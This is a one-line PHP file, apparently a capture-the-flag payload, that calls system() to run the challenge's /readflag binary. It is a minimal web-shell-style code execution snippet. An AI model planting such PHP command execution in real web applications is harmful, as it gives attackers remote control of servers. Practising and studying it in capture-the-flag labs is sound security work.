<?php system("/readflag");
